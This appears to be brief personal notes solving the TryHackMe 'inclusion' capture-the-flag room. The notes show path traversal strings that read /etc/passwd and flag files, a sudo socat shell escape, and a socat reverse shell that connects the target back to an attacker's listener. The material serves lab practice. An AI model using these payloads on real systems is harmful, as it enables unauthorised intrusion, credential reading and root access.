[https://tryhackme.com/room/inclusion#](https://tryhackme.com/room/inclusion#)
 
22  
80
 
Click on any blog post  
See in URL, name="…"  
The page is technically empty, but is including a file from elsewhere  
If the input isn't sanitized, we can have it load a different file from the server for us.  
To get out of the current directory and open /etc/passwd for instance, type:  
../../../../../../../../etc/passwd (to find home directory of user)
 
Sudo -l  
Sudo socat stdin exec:/bin/bash
 
Or
 
(on attacker) socat [file:`tty`,raw,echo=0](http://file:`tty`,raw,echo=0) tcp-listen:1234  
(on target) sudo socat tcp-connect:<your-ip-address>:1234 exec:bash,pty,stderr,setsid,sigint,sane
 
OR
 
Just use LFI for both flags lol (find home of user in /etc/passwd)  
../../../../../../../home/falconfeast/user.txt  
../../../../../../../root/root.txt